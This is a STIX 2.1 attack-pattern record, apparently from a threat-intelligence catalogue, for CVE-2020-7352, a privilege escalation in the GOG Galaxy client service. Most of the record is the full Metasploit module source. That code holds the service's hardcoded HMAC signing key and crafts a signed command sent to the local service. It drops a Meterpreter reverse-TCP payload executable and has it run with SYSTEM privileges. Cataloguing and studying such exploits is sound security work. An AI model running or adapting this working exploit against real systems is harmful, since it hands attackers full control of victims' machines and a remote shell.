{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f9dac218-2f9d-4449-8452-f14359093710",
    "created": "2024-08-14T16:50:02.413293Z",
    "modified": "2024-08-14T16:50:02.413296Z",
    "name": "GOG GalaxyClientService Privilege Escalation",
    "description": " This module will send arbitrary file_paths to the GOG GalaxyClientService, which will be executed with SYSTEM privileges (verified on GOG Galaxy Client v1.2.62 and v2.0.12; prior versions are also likely affected).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/gog_galaxyclientservice_privesc.rb",
            "external_id": "gog_galaxyclientservice_privesc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-7352"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::Windows::Services\n  include Msf::Post::Windows::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GOG GalaxyClientService Privilege Escalation',\n        'Description' => %q{\n          This module will send arbitrary file_paths to the GOG GalaxyClientService, which will be executed\n          with SYSTEM privileges (verified on GOG Galaxy Client v1.2.62 and v2.0.12; prior versions are\n          also likely affected).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Joe Testa <jtesta[at]positronsecurity.com>'\n        ],\n        'Platform' => [ 'win' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Targets' => [\n          [\n            'Windows (Dropper)',\n            {\n              'Platform' => 'win',\n              'Arch' => [ ARCH_X86, ARCH_X64 ],\n              'DefaultOptions' => { 'Payload' => 'windows/meterpreter/reverse_tcp' },\n              'Type' => :dropper\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-04-28',\n        'References' => [\n          ['URL', 'https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/'],\n          ['CVE', '2020-7352']\n        ],\n        'Notes' => {\n          'SideEffects' => [ ARTIFACTS_ON_DISK ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('PATH', [ true, 'The path for the payload', '%TEMP%' ]),\n        OptString.new('WORKING_DIR', [true, 'The initial working directory of the file_path', 'C:\\\\'])\n      ]\n    )\n  end\n\n  def check\n    log_path = expand_path('%PROGRAMDATA%\\\\GOG.com\\\\Galaxy\\\\logs\\\\GalaxyClientService.log')\n    service_path = expand_path('%PROGRAMFILES(x86)%\\\\GOG Galaxy\\\\GalaxyClientService.exe')\n\n    return CheckCode::Safe('Galaxy Client Service not found') unless file_exist?(service_path)\n    return CheckCode::Detected('Unable to determine version') unless file_exist?(log_path)\n\n    log_data = read_file(log_path)\n    unless log_data && /Application\\s+version:\\s+(?<ver_no>\\d+\\.\\d+\\.\\d+\\.\\d*\\.*)/ =~ log_data\n      return CheckCode::Detected('Unable to determine version from log file')\n    end\n\n    return CheckCode::Detected('Galaxy Client version not found') unless ver_no\n\n    version = Rex::Version.new(ver_no)\n\n    return CheckCode::Appears(\"Vulnerable version found: #{ver_no}\") if version < Rex::Version.new('2.0.13')\n\n    CheckCode::Detected(\"Galaxy Client version #{ver_no} not vulnerable\")\n  end\n\n  def exploit\n    fail_with(Failure::None, 'Already running as SYSTEM') if is_system?\n    fail_with(Failure::None, 'Session type must be Meterpreter session') unless session.type == 'meterpreter'\n\n    # The HMAC-SHA512 key for signing file_paths.\n    key = \"\\xc8\\x86\\x07\\xe1\\x18\\x22\\x7a\\x38\\x05\\xc4\\x7f\"\n    key << \"\\x89\\x3d\\xa4\\x1f\\xcb\\xdf\\x16\\x9e\\xc9\\xbb\\xcb\"\n    key << \"\\xfd\\xb1\\x9a\\x9f\\x5b\\x1f\\xeb\\x9f\\x6c\\x1e\\x3c\"\n    key << \"\\x14\\x46\\x44\\x6f\\x9d\\x8d\\xfd\\x67\\x8e\\xc6\\xd4\"\n    key << \"\\x0c\\x38\\x20\\xcb\\x9a\\x29\\xb5\\x2f\\x5d\\xb2\\xfd\"\n    key << \"\\xb6\\xf8\\x0f\\xf9\\x5b\\xf8\\x50\\xaa\\x5d\"\n\n    # Start the GalaxyClientService.  It will automatically terminate after ~10\n    # seconds of inactivity, so we don't need to bother shutting it down later.\n    print_status('Starting GalaxyClientService...')\n    ret = service_start('GalaxyClientService')\n    if ret == 0\n      print_status('Service started successfully.')\n    elsif (ret == 1056) || (ret == 1)\n      print_warning('Service already running.  If the file_path execution fails, try it again in 15 seconds or so.')\n    else\n      print_status(\"Service status unknown (return code: #{ret}).  Continuing anyway...\")\n    end\n\n    print_status('Connecting to service...')\n\n    # Create a TCP socket.\n    handler = client.railgun.ws2_32.socket('AF_INET', 'SOCK_STREAM', 'IPPROTO_TCP')\n    s = handler['return']\n\n    # Set timeout to 10 seconds (0xffff = SOL_SOCKET, 0x1006 = SO_RCVTIMEO).\n    # This only affects the recv(), not connect().\n    _handler = client.railgun.ws2_32.setsockopt(s, 0xffff, 0x1006, [10000].pack('L<'), 4)\n\n    # Set the socket address structure to localhost:9978.\n    sock_addr = \"\\x02\\x00\"\n    sock_addr << [9978].pack('n')\n    sock_addr << Rex::Socket.addr_aton('127.0.0.1')\n    sock_addr << \"\\x00\" * 8\n\n    # Connect to the service.  Retry up to 3 times, waiting 2 seconds in\n    # between.\n    connected = false\n    retries = 0\n    while (retries < 3) && (connected == false)\n      retries += 1\n      handler = client.railgun.ws2_32.connect(s, sock_addr, 16)\n      if handler['GetLastError'] == 0\n        connected = true\n      else\n        print_warning('Connection failed.  Waiting 2 seconds and trying again...')\n        Rex.sleep(2)\n      end\n    end\n\n    fail_with(Failure::Unreachable, 'Failed to connect to service') unless connected\n\n    data = build_payload(key)\n    print_status('Connected to service.  Sending payload...')\n\n    # Here, we are calling client.railgun.ws2_32.send().  However, there's a bug\n    # somewhere in the railgun system such that send() is never called.  It\n    # seems that some mystery code is intercepting send() instead of letting it\n    # get to LibraryWrapper.method_missing() (perhaps 'send' is a special case\n    # somewhere? The other ws2_32 functions work just fine...).  To work around\n    # this problem, we will simply call it directly with call_function().\n    send_func = client.railgun.ws2_32.functions['send']\n    client.railgun.ws2_32._library.call_function(send_func, [s, data, data.length, 0], client)\n\n    # Read the server's response.  On error, it returns nothing.\n    response = \"\\x00\" * 512\n    handler = client.railgun.ws2_32.recv(s, response, response.length, 0)\n\n    # Convert the unsigned return value to a signed value.\n    ret = [handler['return'].to_i].pack('l').unpack1('l')\n    if ret <= 0\n      print_error(\"Failed to read response from service (return value from recv(): #{ret}).  This probably means the exploit failed.  :(\")\n    else\n      print_good('Command executed successfully!')\n    end\n\n    client.railgun.ws2_32.closesocket(s)\n  end\n\n  def build_payload(key)\n    working_dir = datastore['WORKING_DIR']\n\n    header1 = \"\\x00\\x93\\x08\\x04\\x10\\x01\\x18\"\n    header2 = \" \\xa1\\x90\\xec\\xe6\\x05\\xc2\\x0c\\x83\\x01\\n\\x80\\x01\"\n\n    payload_name = \"#{Rex::Text.rand_text_alpha(5..12)}.exe\"\n    file_path = expand_path(\"#{datastore['PATH']}\\\\#{payload_name}\")\n    payload_data = generate_payload_exe\n\n    print_status(\"Writing #{file_path} to target\")\n    write_file(file_path, payload_data)\n    register_file_for_cleanup(file_path)\n\n    gog_cmd = \"\\n#{file_path.length.chr}#{file_path}\\x12\"\n    gog_cmd += \"#{(file_path.length + 4).chr}\\\"#{file_path}\\\"  \\x1a#{working_dir.length.chr}#{working_dir} \\x01(\\x01\"\n\n    payload_hmac = OpenSSL::HMAC.hexdigest('SHA512', key, gog_cmd)\n    header1 + gog_cmd.length.chr + header2 + payload_hmac + gog_cmd\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-28",
    "x_mitre_platforms": [
        "win'"
    ]
}